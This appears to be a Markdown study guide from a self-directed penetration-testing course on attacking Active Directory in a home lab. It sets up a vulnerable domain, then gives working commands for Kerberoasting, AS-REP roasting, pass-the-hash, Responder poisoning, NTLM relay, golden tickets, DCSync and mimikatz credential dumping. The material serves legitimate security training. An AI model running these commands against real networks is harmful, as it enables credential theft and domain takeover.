# 🏢 Phase 6: Active Directory Attacks (Week 9-12)

> **Goal**: Enumerate, attack, and escalate through Active Directory environments.
> **Your existing notes**: `active_directory/` + `AD_hacking/` folders

---

## 📋 Table of Contents

1. [Setup & Targets](#1-setup--targets)
2. [AD Enumeration](#2-ad-enumeration)
3. [BloodHound Analysis](#3-bloodhound-analysis)
4. [Kerberos Attacks](#4-kerberos-attacks)
5. [LLMNR/NBT-NS Poisoning](#5-llmnrnbt-ns-poisoning)
6. [Relay Attacks](#6-relay-attacks)
7. [Lateral Movement](#7-lateral-movement)
8. [Domain Persistence](#8-domain-persistence)
9. [Credential Dumping](#9-credential-dumping)
10. [Practice on Online Platforms](#10-practice-on-online-platforms)
11. [Weekly Schedule](#11-weekly-schedule)
12. [Checklist & Progress Tracker](#12-checklist--progress-tracker)

---

## 1. Setup & Targets

### Free AD Lab Setup

| Component                | Source                                   | Role                     |
| ------------------------ | ---------------------------------------- | ------------------------ |
| Windows Server 2019/2022 | microsoft.com/evalcenter (free 180 days) | Domain Controller (DC01) |
| Windows 10 Enterprise    | microsoft.com/evalcenter (free 90 days)  | Workstation (WS01)       |
| Kali Linux               | kali.org                                 | Attacker                 |

```
Network Layout:
┌─────────┐     ┌─────────┐     ┌─────────┐
│  Kali   │────│  DC01   │────│  WS01   │
│ Attacker│     │ DC/DNS  │     │ Client  │
└─────────┘     └─────────┘     └─────────┘
        All on hacklab internal network
```

### AD Lab Configuration Steps

```powershell
# On DC01 (Windows Server):
# 1. Install AD DS role
Install-WindowsFeature AD-Domain-Services -IncludeManagementTools
Import-Module ADDSDeployment
Install-ADDSForest -DomainName "hacklab.local" -SafeModeAdministratorPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force)

# 2. Create vulnerable users/groups for practice
New-ADUser -Name "svc_sql" -SamAccountName svc_sql -ServicePrincipalNames "MSSQLSvc/DC01.hacklab.local:1433" -AccountPassword (ConvertTo-SecureString "SQLPass123!" -AsPlainText -Force) -Enabled $true
New-ADUser -Name "Bob" -SamAccountName bob -AccountPassword (ConvertTo-SecureString "Password1" -AsPlainText -Force) -Enabled $true
Set-ADAccountControl -Identity bob -DoesNotRequirePreAuth $true  # AS-REP roastable

# On WS01 (Windows 10):
# Join to hacklab.local domain
# Login as a domain user
```

### Online AD Practice (No Setup Needed)

| Platform                            | Challenge               | Free?       |
| ----------------------------------- | ----------------------- | ----------- |
| TryHackMe: Active Directory Basics  | Learn AD fundamentals   | ✅ Yes       |
| TryHackMe: Attacktive Directory     | Full AD attack chain    | ✅ Yes       |
| TryHackMe: Post-Exploitation Basics | Post-exploitation in AD | ✅ Yes       |
| HackTheBox: Active (retired)        | Full AD machine         | ✅ Free tier |
| HackTheBox: Forest (retired)        | AS-REP + BloodHound     | ✅ Free tier |

---

## 2. AD Enumeration

### 2.1 — PowerView (From Domain-Joined Machine)

```powershell
Import-Module .\PowerView.ps1

# Domain information
Get-Domain
Get-DomainController
Get-DomainPolicy

# User enumeration
Get-DomainUser | Select-Object samaccountname, description, memberof
Get-DomainUser -SPN                       # Kerberoastable accounts
Get-DomainUser -PreauthNotRequired        # AS-REP roastable

# Group enumeration
Get-DomainGroup | Select-Object name
Get-DomainGroupMember -Identity "Domain Admins"
Get-DomainGroupMember -Identity "Enterprise Admins"

# Computer enumeration
Get-DomainComputer | Select-Object name, operatingsystem

# Share enumeration
Find-DomainShare -CheckShareAccess

# Find where you have admin access
Find-LocalAdminAccess

# ACL enumeration
Find-InterestingDomainAcl
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs
```

### 2.2 — From Kali (Without Domain Credentials)

```bash
# LDAP anonymous bind
ldapsearch -x -H ldap://DC_IP -b "DC=hacklab,DC=local"

# Enum4linux for AD
enum4linux -a DC_IP

# CrackMapExec
crackmapexec smb DC_IP
crackmapexec smb DC_IP --shares
crackmapexec smb DC_IP --users

# Kerbrute — enumerate valid usernames
kerbrute userenum --dc DC_IP -d hacklab.local users.txt
```

### 2.3 — From Kali (With Domain Credentials)

```bash
# CrackMapExec with credentials
crackmapexec smb DC_IP -u bob -p Password1 --shares
crackmapexec smb DC_IP -u bob -p Password1 --users
crackmapexec smb DC_IP -u bob -p Password1 --groups

# LDAP enumeration
ldapdomaindump DC_IP -u 'hacklab\bob' -p 'Password1'

# RPCClient
rpcclient -U "bob%Password1" DC_IP
# enumdomusers
# enumdomgroups
# querydispinfo
```

---

## 3. BloodHound Analysis

```bash
# Install BloodHound
sudo apt install bloodhound neo4j -y

# Start neo4j
sudo neo4j console
# Default login: neo4j/neo4j (change password on first login)

# Start BloodHound
bloodhound

# Collect data — Option 1: From Windows with SharpHound
.\SharpHound.exe -c All

# Collect data — Option 2: From Kali with bloodhound-python
bloodhound-python -u bob -p Password1 -d hacklab.local -ns DC_IP -c All

# Import the .zip file into BloodHound GUI
# Drag and drop the zip file

# Key queries:
# - "Find Shortest Paths to Domain Admin"
# - "Find All Domain Admins"
# - "Find Kerberoastable Users"
# - "Find AS-REP Roastable Users"
# - "Shortest Paths to Unconstrained Delegation Systems"
```

---

## 4. Kerberos Attacks

### 4.1 — Kerberoasting

```bash
# Find SPNs and request TGS tickets
impacket-GetUserSPNs hacklab.local/bob:Password1 -dc-ip DC_IP -request

# Save hash to file
impacket-GetUserSPNs hacklab.local/bob:Password1 -dc-ip DC_IP -request -outputfile kerb_hash.txt

# Crack the hash
hashcat -m 13100 kerb_hash.txt /usr/share/wordlists/rockyou.txt
john kerb_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# From Windows with Rubeus
.\Rubeus.exe kerberoast /outfile:kerb_hashes.txt
```

### 4.2 — AS-REP Roasting

```bash
# Find users without pre-authentication
impacket-GetNPUsers hacklab.local/ -dc-ip DC_IP -no-pass -usersfile users.txt

# With known credentials
impacket-GetNPUsers hacklab.local/bob:Password1 -dc-ip DC_IP -request

# Crack the hash
hashcat -m 18200 asrep_hash.txt /usr/share/wordlists/rockyou.txt

# From Windows with Rubeus
.\Rubeus.exe asreproast /outfile:asrep_hashes.txt
```

### 4.3 — Pass-the-Ticket / Pass-the-Hash

```bash
# Pass-the-Hash with CrackMapExec
crackmapexec smb DC_IP -u Administrator -H <NTLM_HASH>

# Pass-the-Hash with impacket
impacket-psexec hacklab.local/Administrator@DC_IP -hashes :<NTLM_HASH>
impacket-wmiexec hacklab.local/Administrator@DC_IP -hashes :<NTLM_HASH>

# From Windows with mimikatz
sekurlsa::pth /user:Administrator /domain:hacklab.local /ntlm:<NTLM_HASH>
```

---

## 5. LLMNR/NBT-NS Poisoning

```bash
# On Kali — start Responder
sudo responder -I eth1 -rdw

# Wait for Windows users to mistype hostnames or browse network
# Responder captures NTLMv2 hashes

# Crack captured hashes
hashcat -m 5600 captured_hash.txt /usr/share/wordlists/rockyou.txt
john captured_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

# To trigger: On Windows, type a non-existent hostname:
# \\doesnotexist
# net view \\fakeshare
# Or just browse File Explorer
```

---

## 6. Relay Attacks

```bash
# NTLM Relay — relay captured credentials to another machine
# First, disable SMB and HTTP in Responder config:
sudo nano /etc/responder/Responder.conf
# Set: SMB = Off, HTTP = Off

# Start ntlmrelayx
impacket-ntlmrelayx -tf targets.txt -smb2support

# If successful, you get a shell or SAM dump on the relayed target

# With command execution:
impacket-ntlmrelayx -tf targets.txt -smb2support -c "whoami"
```

---

## 7. Lateral Movement

### From Kali (Impacket Suite)

```bash
# PSExec — full interactive shell (noisy, creates a service)
impacket-psexec hacklab.local/admin:Password@DC_IP

# WMIExec — stealthier than PSExec
impacket-wmiexec hacklab.local/admin:Password@DC_IP

# SMBExec — similar to PSExec
impacket-smbexec hacklab.local/admin:Password@DC_IP

# ATExec — uses Task Scheduler
impacket-atexec hacklab.local/admin:Password@DC_IP "whoami"

# Evil-WinRM (port 5985)
evil-winrm -i DC_IP -u admin -p Password
```

### From Windows

```powershell
# PsExec (Sysinternals)
.\PsExec.exe \\DC01 cmd.exe

# WinRM
Enter-PSSession -ComputerName DC01 -Credential (Get-Credential)
Invoke-Command -ComputerName DC01 -ScriptBlock { whoami }

# RDP
mstsc /v:DC01
```

### CrackMapExec — Test Across Network

```bash
# Test credentials across multiple hosts
crackmapexec smb 192.168.56.0/24 -u admin -p Password
crackmapexec smb 192.168.56.0/24 -u admin -p Password --exec-method smbexec -x "whoami"

# Check for local admin access
crackmapexec smb 192.168.56.0/24 -u admin -p Password --local-auth
```

---

## 8. Domain Persistence

### Golden Ticket

```bash
# Step 1: Get krbtgt hash (requires Domain Admin)
impacket-secretsdump hacklab.local/Administrator:Password@DC_IP

# Step 2: Create Golden Ticket
# With mimikatz:
kerberos::golden /user:Administrator /domain:hacklab.local /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt

# Step 3: Verify
dir \\DC01\C$
klist
```

### Silver Ticket

```bash
# Silver Ticket — forge TGS for a specific service
# With mimikatz:
kerberos::golden /user:Administrator /domain:hacklab.local /sid:<DOMAIN_SID> /target:DC01.hacklab.local /rc4:<SERVICE_HASH> /service:cifs /ptt
```

### DCSync

```bash
# Dump all domain hashes (Domain Admin required)
impacket-secretsdump hacklab.local/Administrator:Password@DC_IP

# With mimikatz:
lsadump::dcsync /domain:hacklab.local /user:krbtgt
lsadump::dcsync /domain:hacklab.local /all /csv
```

---

## 9. Credential Dumping

```bash
# From Kali with impacket
impacket-secretsdump hacklab.local/admin:Password@TARGET_IP

# From Windows with mimikatz
privilege::debug
sekurlsa::logonpasswords     # Dump plaintext passwords/hashes
sekurlsa::tickets            # Dump Kerberos tickets
lsadump::sam                 # Dump local SAM
lsadump::lsa /patch          # Dump LSA secrets
```

---

## 10. Practice on Online Platforms

| Platform       | Room                     | Focus                 |
| -------------- | ------------------------ | --------------------- |
| TryHackMe      | Active Directory Basics  | AD fundamentals       |
| TryHackMe      | Attacktive Directory     | Full AD chain         |
| TryHackMe      | Post-Exploitation Basics | Post-exploitation     |
| TryHackMe      | Breaching AD             | Initial access        |
| TryHackMe      | Enumerating AD           | PowerView/BloodHound  |
| TryHackMe      | Exploiting AD            | Kerberos/relay        |
| HackTheBox     | Active                   | Kerberoasting         |
| HackTheBox     | Forest                   | AS-REP roasting       |
| HackTheBox     | Sauna                    | AS-REP → DCSync       |
| CyberDefenders | AD challenges            | Blue team perspective |

---

## 11. Weekly Schedule

### Week 9-10 — Enumeration & Kerberos

| Day | Activity                              | Time    |
| --- | ------------------------------------- | ------- |
| Mon | AD lab setup / PowerView enumeration  | 2-3 hrs |
| Tue | BloodHound setup and data collection  | 2 hrs   |
| Wed | Kerberoasting (find SPNs, crack TGS)  | 2 hrs   |
| Thu | AS-REP roasting                       | 2 hrs   |
| Fri | LLMNR/NBT-NS poisoning with Responder | 2 hrs   |
| Sat | TryHackMe: Attacktive Directory       | 3 hrs   |
| Sun | Review and document                   | 1 hr    |

### Week 11-12 — Lateral Movement & Persistence

| Day | Activity                                       | Time  |
| --- | ---------------------------------------------- | ----- |
| Mon | Lateral movement (PSExec, WMIExec, Evil-WinRM) | 2 hrs |
| Tue | Pass-the-Hash / Pass-the-Ticket                | 2 hrs |
| Wed | NTLM relay attacks                             | 2 hrs |
| Thu | Credential dumping (secretsdump, mimikatz)     | 2 hrs |
| Fri | Golden/Silver ticket attacks                   | 2 hrs |
| Sat | HackTheBox: Active or Forest                   | 3 hrs |
| Sun | Full AD attack chain report                    | 2 hrs |

---

## 12. Checklist & Progress Tracker

### AD Enumeration
- [ ] PowerView: domain/user/group/computer enumeration
- [ ] BloodHound: collect data, find path to DA
- [ ] CrackMapExec: network-wide enumeration
- [ ] LDAP enumeration from Kali
- [ ] Kerbrute username enumeration

### Kerberos Attacks
- [ ] Kerberoasting (find & crack service tickets)
- [ ] AS-REP roasting (find & crack)
- [ ] Pass-the-Hash
- [ ] Pass-the-Ticket

### Credential Attacks
- [ ] Responder: LLMNR/NBT-NS poisoning
- [ ] NTLM relay attack
- [ ] impacket-secretsdump
- [ ] mimikatz: logonpasswords + SAM dump

### Lateral Movement
- [ ] PSExec (impacket or Sysinternals)
- [ ] WMIExec
- [ ] Evil-WinRM
- [ ] CrackMapExec command execution

### Domain Persistence
- [ ] Golden Ticket creation
- [ ] Silver Ticket creation
- [ ] DCSync attack

### Online Platforms
- [ ] TryHackMe: Attacktive Directory
- [ ] TryHackMe: Enumerating AD
- [ ] HackTheBox: Active or Forest
- [ ] Full AD attack chain documented

---

> **Previous**: [Phase 5 — Windows PrivEsc](../phase_5_windows_privesc/windows_privesc.md)
> **Next Phase**: [Phase 7 — Port Redirection & Tunneling](../phase_7_tunneling/tunneling.md) 🔀
